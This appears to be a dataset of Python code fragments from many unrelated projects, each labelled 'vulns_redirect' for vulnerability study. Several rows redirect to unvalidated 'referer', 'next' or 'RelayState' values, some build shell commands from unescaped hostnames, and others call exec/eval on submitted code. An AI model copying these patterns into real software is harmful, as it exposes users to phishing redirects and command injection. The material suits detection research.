"def download_raw_chems(stats):    response = HttpResponse(content_type='text/csv')    response['Content-Disposition'] = 'attachment; filename=""uncurated_chemicals_%s.csv""' % (datetime.datetime.now().strftime(""%Y%m%d""))    writer = csv.writer(response)    writer.writerow(['data_group_id', 'dashboard_rawchem_id', 'raw_cas', 'raw_chem_name', 'rid'])    for rawchem in RawChem.objects.filter(dsstox_id=None):        writer.writerow([rawchem.extracted_text.data_document.data_group.id, rawchem.id, rawchem.raw_cas, rawchem.raw_chem_name, rawchem.rid if rawchem.rid else '' ])    return re",vulns_redirect
        full_p_count = Product.objects.filter( Q(title__icontains=q) | Q(brand_name__icontains=q) ).count(),vulns_redirect
        return str(self.content_object),vulns_redirect
"        p = self.objects.puc        puc_line = (p.gen_cat + ',' + p.prod_fam + ',' + p.prod_type + ',' + p.description +                    ',' + str(p.get_level()) + ',' + str(p.product_count))        self.assertEqual(csv_lines[0], ('gen_cat,prod_fam,prod_type,description,'                                        'PUC_type,num_prods'))        self.assertEqual(csv_lines[1], puc_line)",vulns_redirect
"    cols = ['gen_cat','prod_fam','prod_type','description','PUC_type','num_prods']",vulns_redirect
from django.db.models import F,vulns_redirect
"            'qa_notes': forms.Textarea,",vulns_redirect
"        fields = ['doc_date', 'cat_code',                  'description_cpcat', 'cpcat_sourcetype']",vulns_redirect
from .extracted_habits_and_practices_to_puc import (                                            ExtractedHabitsAndPracticesToPUC)from .extracted_habits_and_practices import ExtractedHabitsAndPractices,vulns_redirect
        return str(self.content_object),vulns_redirect
from .extracted_list_presence import ExtractedListPresence,vulns_redirect
        doc_types = DocumentType.objects.filter(group_type=this_type),vulns_redirect
from .common_info import CommonInfofrom django.db.models.signals import pre_save,vulns_redirect
from .extracted_text import ExtractedText,vulns_redirect
from django.core.exceptions import ValidationErrorfrom .extracted_text import ExtractedText,vulns_redirect
"from django.db import modelsfrom dashboard.models import CommonInfoclass ExtractedListPresence(CommonInfo, RawChem):",vulns_redirect
from itertools import chainfrom datetime import datetimefrom django.core.exceptions import ValidationErrorfrom django import forms,vulns_redirect
"    def fetch_extracted_records(self):    def pull_out_cp(self):        if hasattr(self, 'extractedcpcat'):            return self.extractedcpcat        else:            return self    def pull_out_hh(self):        if hasattr(self, 'extractedhhdoc'):            return self.extractedhhdoc        else:            return self",vulns_redirect
from .weight_fraction_type import WeightFractionTypefrom .extracted_chemical import ExtractedChemical,vulns_redirect
"    extracted_text = models.OneToOneField(ExtractedText, on_delete=models.CASCADE)        return 'Notes for {}'.format(self.extracted_text)        if self.extracted_text.qa_edited and not self.qa_notes:                    _('Before approving, please add a note explaining your edits to the extracted data'))",vulns_redirect
"from .dsstox_lookup import DSSToxLookupfrom .extracted_text import ExtractedTextfrom django.dispatch import receiver    extracted_text = models.ForeignKey(ExtractedText, related_name = 'rawchem', ",vulns_redirect
"    dsstox = models.ForeignKey(DSSToxLookup, related_name = 'curated_chemical', on_delete=models.PROTECT,",vulns_redirect
"    url = models.CharField(max_length  = 100,",vulns_redirect
"    title = models.CharField(max_length=100, blank=False, null=False)",vulns_redirect
"        p = self.objects.puc        puc_line = (p.gen_cat + ',' + p.prod_fam + ',' + p.prod_type + ',' + p.description +                    ',' + str(p.get_level()) + ',' + str(p.product_count))        self.assertEqual(csv_lines[0], ('gen_cat,prod_fam,prod_type,description,'                                        'PUC_type,num_prods'))        self.assertEqual(csv_lines[1], puc_line)",vulns_redirect
from django.test import Client,vulns_redirect
    def test_fetch_extracted_records(self):        ''' Confirm that each detail child object returned by the fetch_extracted_records            for ex_child in et.fetch_extracted_records():                child_model = ex_child.__class__ # the fetch_extracted_records function returns different classes,vulns_redirect
            extracted_text_form = ParentForm(instance=et),vulns_redirect
"        ''''Assure that the number of child forms is appropriate for the group        type.        group_models = {                        'CO': ExtractedChemical,                        'FU': ExtractedFunctionalUse,                        'HP': ExtractedHabitsAndPractices,                        'CP': ExtractedListPresence,                        'HH': ExtractedHHRec        }        for code, model in group_models.items():",vulns_redirect
"from lxml import htmlfrom importlib import import_modulefrom django.test import Clientfrom dashboard.views.data_group import ExtractionScriptForm, DataGroupFormfrom django.core.files.uploadedfile import SimpleUploadedFilefrom django.test import Clientfrom importlib import import_module",vulns_redirect
"        response = self.client.post(f'/qa/extractedtext/{pk}/',{'approve':[47]})",vulns_redirect
        response = self.c.get('/find/?q=diatom&group_type=Unidentified'),vulns_redirect
"            response = self.client.get(f'/qa/extractedtext/%s' % et.data_document_id, follow=True)            self.assertEqual(response.status_code, 200)",vulns_redirect
"from lxml import htmlfrom django.test import TestCasefrom dashboard.tests.loader import load_model_objects, fixtures_standardfrom selenium import webdriverfrom django.conf import settingsfrom selenium.webdriver.support.select import Selectfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ec",vulns_redirect
        if settings.TEST_BROWSER == 'firefox':            self.browser = webdriver.Firefox()        else:            self.browser = webdriver.Chrome(),vulns_redirect
"            doc_detail_link = f'/datadocument/%s/' % doc_id            self.browser.get(self.live_server_url + doc_detail_link)            doc_type_select = Select(self.browser.find_element_by_xpath(                '//*[@id=""id_document_type""]'))            doc_type_select.select_by_visible_text(""MSDS"")            self.assertIn(doc_detail_link, self.browser.current_url)",vulns_redirect
"            raw_chem = self.browser.find_element_by_xpath(                '//*[@id=""id_rawchem-0-raw_chem_name""]')",vulns_redirect
"            qa_notes_field = self.browser.find_element_by_xpath(                '//*[@id=""id_qa_notes""]')            self.assertIn('is-invalid', qa_notes_field.get_attribute('class'))",vulns_redirect
from lxml import htmlfrom django.test import TestCasefrom dashboard.tests.loader import load_model_objectsfrom dashboard.models import *import csvimport timeimport unittestimport collectionsimport jsonimport refrom selenium import webdriverfrom selenium.webdriver.support.select import Selectfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.common.keys import Keysfrom selenium.common.exceptions import NoSuchElementExceptionfrom django.conf import settings,vulns_redirect
        if settings.TEST_BROWSER == 'firefox':            self.browser = webdriver.Firefox()        else:            self.browser = webdriver.Chrome(),vulns_redirect
"                       '08_script',                    '09_productdocument',                      '10_habits_and_practices',                     '11_habits_and_practices_to_puc',                        '13_puc_tag'                        ]",vulns_redirect
from django.core.exceptions import ValidationErrorfrom dashboard.tests.loader import load_model_objects,vulns_redirect
"    def test_extracted_text_qa_notes(self):        self.objects.extext.qa_edited = True        note = QANotes.objects.create(extracted_text=self.objects.extext)        self.assertEqual(note.qa_notes, None)        self.assertRaises(ValidationError, note.clean)",vulns_redirect
from django.http import HttpRequestfrom lxml import htmlfrom dashboard.models import *,vulns_redirect
"    cols = ['gen_cat','prod_fam','prod_type','description','PUC_type','num_prods']",vulns_redirect
from django import forms,vulns_redirect
"        doc, extra=edit, can_delete=edit)        extracted_text = ExtractedText.objects.get_subclass(pk=doc.pk)         extracted_text_form = ParentForm(instance=extracted_text)        colors = ['#d6d6a6', '#dfcaa9', '#d8e5bf'] * 47        color = (hex for hex in colors)        for form in child_formset.forms:            form.color = next(color)",vulns_redirect
    referer = request.POST['referer'] if request.POST['referer'] else 'data_document',vulns_redirect
    referer = request.POST['referer'] if request.POST['referer'] else 'data_document',vulns_redirect
"def data_document_edit(request, pk):    referer = request.POST['referer'] if request.POST['referer'] else 'data_document'    doc = get_object_or_404(DataDocument, pk=pk)    ParentForm, _ = create_detail_formset(doc, extra=0, can_delete=False)    model = ParentForm.Meta.model    script = Script.objects.get(title__icontains='Manual (dummy)')    exttext, _ = model.objects.get_or_create(extraction_script=script,                                             data_document_id=pk)    form = ParentForm(request.POST, instance=exttext)        form.save()        return redirect(referer, pk=doc.pk)    else:        return HttpResponse(""Houston, we have a problem."")",vulns_redirect
from itertools import islicefrom collections import OrderedDictfrom django import formsfrom django.urls import reverse,vulns_redirect
"                             ExtractionScriptForm,                             CleanCompDataForm,                             create_detail_formset,                             include_extract_form,                             include_clean_comp_data_form)",vulns_redirect
from datetime import datetimefrom .data_group import DataGroupForm,vulns_redirect
"from django import formsfrom django.db import connectionfrom django.db.models import Count, Q, Value, IntegerField, Subquery, OuterRef, F, Sumfrom django.forms.models import model_to_dict",vulns_redirect
"from dal import autocompletefrom django.shortcuts import (render, redirect, get_object_or_404,                                                HttpResponseRedirect)from django.utils.translation import ugettext_lazy as _",vulns_redirect
"from django.utils import timezone, safestringfrom django.forms import ModelFormfrom dashboard.forms import (ProductPUCForm, ProductLinkForm,                             BulkProductPUCForm, BulkProductTagForm,                             BulkPUCForm, ProductForm)from taggit.forms import TagFieldfrom taggit_labels.widgets import LabelWidgetclass FilteredLabelWidget(LabelWidget):    def tag_list(self, tags):        puc = self.form_instance.instance.get_uber_puc() or None        qs = self.model.objects.filter(content_object=puc,assumed=False)        filtered = [unassumed.tag for unassumed in qs]        return [(tag.name, 'selected taggit-tag' if tag.name in tags else 'taggit-tag')                for tag in filtered]class ProductTagForm(ModelForm):    tags = TagField(required=False, widget=FilteredLabelWidget(model=PUCToTag))    class Meta:        model = Product        fields = ['tags']    def __init__(self, *args, **kwargs):        super(ProductTagForm, self).__init__(*args, **kwargs)        self.fields['tags'].widget.form_instance = self",vulns_redirect
"    exttext, _ = model.objects.get_or_create(extraction_script=script,                                             data_document_id=pk)",vulns_redirect
DEBUG = True,vulns_redirect
"    return subprocess.call([""/bin/sh"", ""-c"", ""command -v ""+program], shell=False, stdout=open(os.devnull), stderr=open(os.devnull))==0",vulns_redirect
def genOR():    pass,vulns_redirect
"    params['redirect'] = 'https://www.google.com'    fullURL = generate_url_with_params(url, params)    req = requests.get(fullURL)    if req.content.find('google') != -1:        success_message(fullURL)",vulns_redirect
"        return render_template('dashboard.html',                                invites_list=invites_list, ",vulns_redirect
"    flash(""Board created! MAKE THAT BOARD SHOW AS DEFAULT!!!!"")",vulns_redirect
import arrowfrom rest_framework.generics import CreateAPIViewfrom realpal.apps.chat.models import Messagefrom realpal.apps.chat.serializers import MessageSerializerfrom realpal.apps.chat.models import Room,vulns_redirect
from rest_framework.validators import ValidationErrorfrom .models import Message,vulns_redirect
from realpal.apps.chat.api import MessageCreateAPIView,vulns_redirect
"        self.client.login(username='testuser', password='password')",vulns_redirect
"            response = self.client.post(update_url, data_to_pass)        self.client.post(update_url, data)        self.client.post(update_url, data)        self.client.post(update_url, data)        self.client.post(update_url, data)        self.client.post(update_url, data)        self.client.post(update_url, data)",vulns_redirect
"        self.client.post(update_url, data)",vulns_redirect
"from oi.projects.models import Project, OINeedsPrjPermsfrom oi.helpers import OI_READ",vulns_redirect
"    with open(step.source_path, 'r') as f:        source_code = f.read()",vulns_redirect
        return 'utf8'    def read_all(self) -> str:,vulns_redirect
            return buffered_bytes.decode(self.source_encoding)    def flush_all(self) -> str:,vulns_redirect
        return contents.decode(self.source_encoding),vulns_redirect
            contents = self.stdout_interceptor.read_all(),vulns_redirect
            contents = self.stdout_interceptor.flush_all(),vulns_redirect
            return self.stderr_interceptor.read_all(),vulns_redirect
            return self.stderr_interceptor.flush_all(),vulns_redirect
"from flask import Flask, url_for, render_template, request, make_response, jsonify, json, Response",vulns_redirect
"  name = name.lower()  politician = None  for p in politicians:    politician = p  if politician != None:    return render_template('politician.html', q = name, politician = politician)",vulns_redirect
"  query = request.args.get('q').lower()  politician = None  for p in politicians:    politician = p  if politician != None:    politician.search_count = politician.search_count + 1    politician.put()    return render_template('politician.html', q = query, politician = politician)",vulns_redirect
	def prepare_for_processing(self):,vulns_redirect
"				print attrs[""student""]				print attrs[""book_edition""]				print attrs[""chapter""]					print attrs[""number""]					print getText(problem.childNodes)",vulns_redirect
"			assert(assignment.chapter == int(sys.argv[1]))			print ""num_probs was ""+str(num_probs)+"" for student ""+assignment.student",vulns_redirect
		print len(self.problems),vulns_redirect
"		self.p.pprint(self.code_list)		print self.count_by_groups	def process_hwml(self):		self.prepare_for_processing()			print ""In book edition ""+str(book_edition)+"" on problem ""+problem_number				print ""=""*50				print item				print ""=""*50				print ""problem count is now: ""+str(another_count_by_groups)	def detect_cheating(self):		self.prepare_for_processing()",vulns_redirect
"				print (t,s)def process_problem_scores(code_list):",vulns_redirect
"		problem_groups[prob_id].append(problem(assignment_student,book_edition,chapter,problem_number,prob_code))	print ""Answer ID Number, Book Edition, Student Name, Problem Number, Problem Order, Score, Notes""			print str(item.code)+"", ""+str(book_edition)+"", ""+str(item.student)+"", ""+str(item.number)+"", ""+str(another_count_by_groups)",vulns_redirect
"	def __init__(self,file,number,text):",vulns_redirect
def root_redirect(request):        link = dynamic_link.format('{}/'.format(settings.PUBLIC_DOMAIN))        link = '{}/'.format(settings.APP_DEEPLINK_DOMAIN),vulns_redirect
class RedirectRootTestCase(TestCase):        RedirectRootTestCase.ScenarioMaker() \                .when_call_root_redirect() \                .then_response_should_be_a_redirect_to('http://dynamic.link/link=http://pachatary.com/&other=param')        RedirectRootTestCase.ScenarioMaker() \                .when_call_root_redirect() \                .then_response_should_be_a_redirect_to('pachatary://app/'),vulns_redirect
        def when_call_root_redirect(self):            self.response = client.get(reverse('root-redirect')),vulns_redirect
"        root_redirect, aasa_redirect",vulns_redirect
"    url(r'^$',        root_redirect,        name='root-redirect'),",vulns_redirect
"    listview = TransactionList.as_view()    return listview(request, filter_data=filter_data)",vulns_redirect
STEP_2 = 'instructor_intro'STEP_8 = 'invite_somebody',vulns_redirect
INVITE_SOMEBODY = STEP_8,vulns_redirect
        onboarding.STEP_8,vulns_redirect
"    onboarding.INVITE_SOMEBODY: ONBOARDING_STEPS_DEFAULT_TEMPLATE,",vulns_redirect
"        ({onboarding.STEP_1: 0, onboarding.STEP_2: 0, onboarding.STEP_3: 0, onboarding.STEP_4: 0, onboarding.STEP_5: 0, onboarding.STEP_6: 0, onboarding.STEP_7: 0, onboarding.STEP_8: 0}, 0),        ({onboarding.STEP_1: 1, onboarding.STEP_2: 0, onboarding.STEP_3: 0, onboarding.STEP_4: 0, onboarding.STEP_5: 0, onboarding.STEP_6: 0, onboarding.STEP_7: 0, onboarding.STEP_8: 0}, 13.0),        ({onboarding.STEP_1: 0, onboarding.STEP_2: 1, onboarding.STEP_3: 0, onboarding.STEP_4: 0, onboarding.STEP_5: 0, onboarding.STEP_6: 1, onboarding.STEP_7: 1, onboarding.STEP_8: 0}, 38.0),        ({onboarding.STEP_1: 0, onboarding.STEP_2: 0, onboarding.STEP_3: 1, onboarding.STEP_4: 1, onboarding.STEP_5: 1, onboarding.STEP_6: 1, onboarding.STEP_7: 0, onboarding.STEP_8: 0}, 50.0),        ({onboarding.STEP_1: 1, onboarding.STEP_2: 0, onboarding.STEP_3: 1, onboarding.STEP_4: 1, onboarding.STEP_5: 1, onboarding.STEP_6: 1, onboarding.STEP_7: 1, onboarding.STEP_8: 0}, 75.0),        ({onboarding.STEP_1: 1, onboarding.STEP_2: 1, onboarding.STEP_3: 1, onboarding.STEP_4: 1, onboarding.STEP_5: 1, onboarding.STEP_6: 1, onboarding.STEP_7: 1, onboarding.STEP_8: 1}, 100.0)",vulns_redirect
"        (onboarding.INVITE_SOMEBODY, ONBOARDING_STEPS_DEFAULT_TEMPLATE),",vulns_redirect
"                onboarding.INVITE_SOMEBODY: {                    ""html"": ""<p>invite_somebody</p>"",                    ""description"": ""invite_somebody desc"",                    ""title"": ""invite_somebody""                },",vulns_redirect
"            onboarding.INVITE_SOMEBODY: {                ""done"": True,                ""settings"": {                    ""html"": ""<p>invite_somebody</p>"",                    ""description"": ""invite_somebody desc"",                    ""title"": ""invite_somebody""                }            },",vulns_redirect
"            onboarding.INVITE_SOMEBODY: True,",vulns_redirect
"        for instructor in Instructor.objects.all():            try:                course = Course.objects.get(id=settings.ONBOARDING_INTRODUCTION_COURSE_ID)            except Course.DoesNotExist:                print(""Onboarding course is not provided"")                return",vulns_redirect
"            if Lesson.objects.filter(addedBy=instructor.user).exists():            if Invite.objects.filter(instructor=instructor).exists():                update_onboarding_step(onboarding.STEP_8, instructor.user_id)",vulns_redirect
"    update_onboarding_step(onboarding.STEP_5, instance.addedBy.id)",vulns_redirect
"@receiver(post_save, sender=Invite)def onboarding_invite_created(sender, instance, **kwargs):    update_onboarding_step(onboarding.STEP_8, instance.instructor.use",vulns_redirect
"    def get(self, request, *args, **kwargs):        my_courses = self.get_my_courses()        if not my_courses and not self.request.user.invite_set.all():            return redirect('ctms:create_course')        if not my_courses and self.request.user.invite_set.all():            return redirect('ctms:shared_courses')        return super(MyCoursesView, self).get(request, *args, **kwargs)",vulns_redirect
        users_courselet = Unit.objects.filter(addedBy=self.request.user).last(),vulns_redirect
"        steps = [            (key, status.get(key, {}).get('done', False), status.get(key, {}).get('settings', {}))            for key in get_onboarding_steps()        ]        context.update({            'steps': steps,        })",vulns_redirect
"    ConfigOption(""default_cache_ttl"", 365 * 24 * 60 * 60, """"""",vulns_redirect
"            if proc.is_running() and system(""exec >(ping %s -c 10 >/dev/null) </dev/null"" % self.hostname) is 0:",vulns_redirect
"        is_up = True if os.system(""exec >(ping -c 1 -w 2 %s >/dev/null) </dev/null"" % hostname) is 0 else False",vulns_redirect
"            sys.exit(""Host '%s' is unknown! Update your /etc/hosts file!"" % hostname)",vulns_redirect
"from typing import Dict, TYPE_CHECKING",vulns_redirect
"def pshtt_data_to_result(securedrop: DirectoryEntry, pshtt_results: Dict) -> ScanResult:    """"""    Takes a DirectoryEntry and a dictionary of pshtt results for that domain,    scans the page itself and then combines those results into an unsaved    ScanResult object    """"""        page, soup = request_and_scrape_page(securedrop.landing_page_url)        no_redirects_page, _ = request_and_scrape_page(            securedrop.landing_page_url, allow_redirects=False        )            securedrop=securedrop,            live=pshtt_results['Live'],    return ScanResult(        landing_page_url=securedrop.landing_page_url,        live=pshtt_results['Live'],        http_status_200_ok=validate_200_ok(no_redirects_page),        forces_https=bool(pshtt_results['Strictly Forces HTTPS']),        hsts=pshtt_results['HSTS'],        hsts_max_age=validate_hsts_max_age(pshtt_results['HSTS Max Age']),        hsts_entire_domain=validate_hsts_entire_domain(pshtt_results['HSTS Entire Domain']),        hsts_preloaded=pshtt_results['HSTS Preloaded'],        subdomain=validate_subdomain(securedrop.landing_page_url),        no_cookies=validate_no_cookies(page),        safe_onion_address=validate_onion_address_not_in_href(soup),        no_cdn=validate_not_using_cdn(page),        http_no_redirect=validate_no_redirects(no_redirects_page),        expected_encoding=validate_encoding(page),        no_analytics=validate_not_using_analytics(page),        no_server_info=validate_server_software(page),        no_server_version=validate_server_version(page),        csp_origin_only=validate_csp(page),        mime_sniffing_blocked=validate_no_sniff(page),        noopen_download=validate_download_options(page),        xss_protection=validate_xss_protection(page),        clickjacking_protection=validate_clickjacking_protection(page),        good_cross_domain_policy=validate_cross_domain_policy(page),        http_1_0_caching_disabled=validate_pragma(page),        expires_set=validate_expires(page),        cache_control_set=validate_cache_control_set(page),        cache_control_revalidate_set=validate_cache_must_revalidate(page),        cache_control_nocache_set=validate_nocache(page),        cache_control_notransform_set=validate_notransform(page),        cache_control_nostore_set=validate_nostore(page),        cache_control_private_set=validate_private(page),        referrer_policy_set_to_no_referrer=validate_no_referrer_policy(page),    )def scan(securedrop: DirectoryEntry, commit=False) -> ScanResult:    securedrop_domain = url_to_domain(securedrop.landing_page_url)    pshtt_results = inspect_domains([securedrop_domain], {'timeout': 10})    result = pshtt_data_to_result(securedrop, pshtt_results[0])        result.securedrop = securedrop",vulns_redirect
"    domains = securedrops.values_list('domain', flat=True)    results = inspect_domains(domains, {'timeout': 10})    for result_data in results:        securedrop = securedrops.get(domain=result_data['Domain'])        current_result = pshtt_data_to_result(securedrop, result_data)        current_result.compute_grade()        current_result.securedrop = securedrop            prior_result = securedrop.results.latest()",vulns_redirect
"    relay_state = request.form.get('RelayState', '/')",vulns_redirect
"    relay_state = request.form.get('RelayState', '/')",vulns_redirect
            'TOKEN_LOGIN_FAILURE_REDIRECT_URL': 'http://test.localhost/failure',vulns_redirect
"    def authn(self, url, force_authn=False):",vulns_redirect
"            resp = c.get(url)                                                       session, '/', None,    def acs(self, url, eppn, check_fn):",vulns_redirect
        came_from = '/camefrom/',vulns_redirect
"                                               'RelayState': 'testing-relay-state',",vulns_redirect
"                                               'RelayState': 'testing-relay-state',",vulns_redirect
"                                                 'RelayState': 'testing-relay-state',",vulns_redirect
"                                               'RelayState': 'testing-relay-state',",vulns_redirect
"                                                 'RelayState': 'testing-relay-state',",vulns_redirect
"                                               'RelayState': 'testing-relay-state',",vulns_redirect
from eduid_webapp.authn.helpers import verify_auth_token,vulns_redirect
"    relay_state = request.args.get('next', redirect_url)",vulns_redirect
"                location = request.form.get('RelayState', location)",vulns_redirect
"import argparse, ast, json, sys, keyword, math",vulns_redirect
"    exec(code_obj, instr_globals, instr_locals)",vulns_redirect
"      result = eval(test_case_obj, instr_globals, instr_locals)      dock_points(deductions, points_per_case, 'exception during test case %d' % i)",vulns_redirect
"            tab_title = self.create_tab_title_from_filepath(                filechooser_opening_dialog.get_filename())            self.start_database_opening_routine(                tab_title, filechooser_opening_dialog.get_filename())",vulns_redirect
"        if password_unlock_entry.get_text() != """":",vulns_redirect
    return False  # for now,vulns_redirect
"from django.http import HttpResponse, HttpResponseRedirectfrom django.shortcuts import get_object_or_404, render",vulns_redirect
            return HttpResponseRedirect(domain),vulns_redirect
"from django.shortcuts import get_object_or_404, render",vulns_redirect
            return HttpResponseRedirect(filehash),vulns_redirect
"    keyword = forms.CharField(label='', max_length=100, required=True)",vulns_redirect
"from django.http import HttpResponse, HttpResponseRedirectfrom django.shortcuts import get_object_or_404, render",vulns_redirect
            return HttpResponseRedirect(ip),vulns_redirect
"from django.http import HttpResponse, HttpResponseRedirectfrom django.shortcuts import get_object_or_404, render",vulns_redirect
"from django.http import HttpResponse, HttpResponseRedirect",vulns_redirect
"from django.http import HttpResponse, HttpResponseRedirectfrom django.shortcuts import get_object_or_404, render",vulns_redirect
"from django.http import HttpResponse, HttpResponseRedirect",vulns_redirect
"    keyword = forms.CharField(label='', max_length=100, required=True)",vulns_redirect
"        'jupyterlab 0.35.3',        'nteract_on_jupyter 1.9.12',",vulns_redirect
"        'jupyterhub==0.9.4',        'oauthenticator==0.8.0'",vulns_redirect
"        'jupyterhub==0.9.4',        'notebook==5.7.0',        'jupyterlab==0.35.3',        'nteract-on-jupyter==1.9.12',",vulns_redirect
"    HttpResponseRedirect,",vulns_redirect
"    path = posixpath.normpath(unquote(path))    path = path.lstrip('/')    newpath = ''    for part in path.split('/'):        if not part:            continue        drive, part = os.path.splitdrive(part)        head, part = os.path.split(part)        if part in (os.curdir, os.pardir):            continue        newpath = os.path.join(newpath, part).replace('\\', '/')    if newpath and path != newpath:        return HttpResponseRedirect(newpath)    fullpath = os.path.join(document_root, newpath)            return directory_index(newpath, fullpath)",vulns_redirect
"    HttpResponseRedirect,",vulns_redirect
"    path = posixpath.normpath(unquote(path))    path = path.lstrip('/')    newpath = ''    for part in path.split('/'):        if not part:            continue        drive, part = os.path.splitdrive(part)        head, part = os.path.split(part)        if part in (os.curdir, os.pardir):            continue        newpath = os.path.join(newpath, part).replace('\\', '/')    if newpath and path != newpath:        return HttpResponseRedirect(newpath)    fullpath = os.path.join(document_root, newpath)            return directory_index(newpath, fullpath)",vulns_redirect
"    HttpResponseRedirect,",vulns_redirect
"    path = posixpath.normpath(unquote(path))    path = path.lstrip('/')    newpath = ''    for part in path.split('/'):        if not part:            continue        drive, part = os.path.splitdrive(part)        head, part = os.path.split(part)        if part in (os.curdir, os.pardir):            continue        newpath = os.path.join(newpath, part).replace('\\', '/')    if newpath and path != newpath:        return HttpResponseRedirect(newpath)    fullpath = os.path.join(document_root, newpath)            return directory_index(newpath, fullpath)",vulns_redirect
    def _set_redirect_uri(self):        next_uri = self.GET.get('next')        if next_uri is not None:            self.session.data['_redirect_uri'] = next_uri    set_redirect_uri = _set_redirect_uri,vulns_redirect
        req._set_redirect_uri(),vulns_redirect
"    def test_set_redirect_uri(self):        req = EngineAuthRequest.blank('/auth/google')        req._load_session()        req.set_redirect_uri()        req._config = {'success_uri': '/callback'}        redirect_uri = req.get_redirect_uri()        self.assertEqual(redirect_uri, '/callback')        req = EngineAuthRequest.blank('/auth/google?next=/newcallback')        req._load_session()        req.set_redirect_uri()        req._config = {'success_uri': '/callback'}        redirect_uri = req.get_redirect_uri()        self.assertEqual(redirect_uri, '/newcallback')        req = EngineAuthRequest.blank('/auth/google?next=/newcallback&a=121&123=a')        req._load_session()        req.set_redirect_uri()        req._config = {'success_uri': '/callback'}        redirect_uri = req.get_redirect_uri()        self.assertEqual(redirect_uri, '/newcallback')",vulns_redirect
"              Endpoint, Task",vulns_redirect
from django.http import HttpResponse,vulns_redirect
from django.utils.translation import gettext as _from screendoor.redactor import parse_applications,vulns_redirect
    mail_sent = send_mail(,vulns_redirect
            request.GET._mutable = True            request.GET['key'] = None            request.GET._mutable = False            account_key = request.GET.get('key')            if EmailAuthenticateToken.objects.filter(key=account_key).exists():                token = EmailAuthenticateToken.objects.get(key=account_key)                user = token.user                user.email_confirmed = True                user.save()                token.delete(),vulns_redirect
            position = create_position_form.save(commit=False)            d = parse_upload(position)            errors = d.get('errors')                position = d.get('position'),vulns_redirect
"            position = Position.objects.get(id=request.session['position_id'])            request.user.positions.add(position)@login_required(login_url='/login/', redirect_field_name=None)def positions(request):        sort_by = request.session['position_sort']        sort_by = '-created'        if request.POST.get(""sort-created""):            sort_by = '-created'        elif request.POST.get(""sort-closed""):            sort_by = '-date_closed'        elif request.POST.get(""sort-position""):            sort_by = 'position_title'        elif request.POST.get(""position""):",vulns_redirect
"from django.utils.translation import gettext as _import magic, mimetypes    CreateAccountFormText, StandardFormText, LoginFormText",vulns_redirect
            msg = forms.ValidationError(ErrorMessages.empty_create_position_form),vulns_redirect
                     ErrorMessages.url_upload_not_supported_yet),vulns_redirect
"    path('position/', views.position, name='position'),",vulns_redirect
"from .models import EmailAuthenticateToken, Position",vulns_redirect
        return True    return False,vulns_redirect
            if (authenticate_user(request.GET.get('key'))):,vulns_redirect
"            return position(request, Position.objects.get(",vulns_redirect
"            return position(request, Position.objects.get(",vulns_redirect
"    return {'baseVisibleText': InterfaceText, 'applicationsForm': ImportApplicationsForm, 'positionText': PositionText, 'userVisibleText': PositionsViewText, 'position': position}def position(request, position):",vulns_redirect
"                next_url = request.GET[""next""]",vulns_redirect
"        next_url = request.GET.get('next', reverse('home'))",vulns_redirect
"    def get_full_path(self, filename, language=None, version_slug=None):",vulns_redirect
"        if re.match('^https?://', filename):",vulns_redirect
"            full_path = self.get_full_path(path, language, version_slug)",vulns_redirect
import urllib,vulns_redirect
    fp = urllib.urlopen(url)    f = StringIO.StringIO(fp.read())  finally:    if fp:      fp.close(),vulns_redirect
import urllib2,vulns_redirect
"  logger.debug(""Opening url: [%s]"", target_url)  try:    fp = urllib2.urlopen(target_url)    result = fp.read()  except urllib2.HTTPError, e:    logger.warning(""Server definitions didn't return any results %s."", e)    return {}  fp.close()",vulns_redirect
"                        ""description"": description",vulns_redirect
"            self.update_package(package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources)",vulns_redirect
"                        ""description"": description",vulns_redirect
"            self.update_package(package_id, security_classification, data_driven_application, version, author_email, notes, update_frequency, resources)",vulns_redirect
"def _send_mail(user_ids, action_type, datarequest):",vulns_redirect
"            mailer.mail_user(user_data, subject, body)",vulns_redirect
"        tk.enqueue_job(_send_mail, [users, 'new_datarequest_organisation', datarequest_dict], title=u'Data Request Created Email')",vulns_redirect
"        tk.enqueue_job(_send_mail, [users, 'new_datarequest_organisation', datarequest_dict], title=u'Data Request Assigned Email')        tk.enqueue_job(_send_mail, [users, 'unassigned_datarequest_organisation', datarequest_dict], title=u'Data Request Unassigned Email')",vulns_redirect
"    tk.enqueue_job(_send_mail, [users, 'close_datarequest_creator', datarequest_dict], title=u'Data Request Closed Send Email')",vulns_redirect
"    tk.enqueue_job(_send_mail, [users, 'open_datarequest_creator', datarequest_dict], title=u'Data Request Opened Creator Email')        tk.enqueue_job(_send_mail, [users, 'open_datarequest_organisation', datarequest_dict], title=u'Data Request Opened Admins Email')",vulns_redirect
"def _send_mail(user_ids, action_type, datarequest):",vulns_redirect
"            mailer.mail_user(user_data, subject, body)",vulns_redirect
"        tk.enqueue_job(_send_mail, [users, 'new_datarequest_organisation', datarequest_dict], title=u'Data Request Created Email')",vulns_redirect
"        tk.enqueue_job(_send_mail, [users, 'new_datarequest_organisation', datarequest_dict], title=u'Data Request Assigned Email')        tk.enqueue_job(_send_mail, [users, 'unassigned_datarequest_organisation', datarequest_dict], title=u'Data Request Unassigned Email')",vulns_redirect
"    tk.enqueue_job(_send_mail, [users, 'close_datarequest_creator', datarequest_dict], title=u'Data Request Closed Send Email')",vulns_redirect
"    tk.enqueue_job(_send_mail, [users, 'open_datarequest_creator', datarequest_dict], title=u'Data Request Opened Creator Email')        tk.enqueue_job(_send_mail, [users, 'open_datarequest_organisation', datarequest_dict], title=u'Data Request Opened Admins Email')",vulns_redirect
"                         'matisse = Matisse(); print(\'Access the Matisse using \\\'matisse.[method]\\\'\')""')",vulns_redirect
from contextlib import redirect_stdout,vulns_redirect
    with redirect_stdout(gui.log_stream):        exit_code = gui.exec(),vulns_redirect
"    'version': '10.0.0.0.1',",vulns_redirect
        redirect = str('/'+referer.split('/')[-1]),vulns_redirect
            return;,vulns_redirect
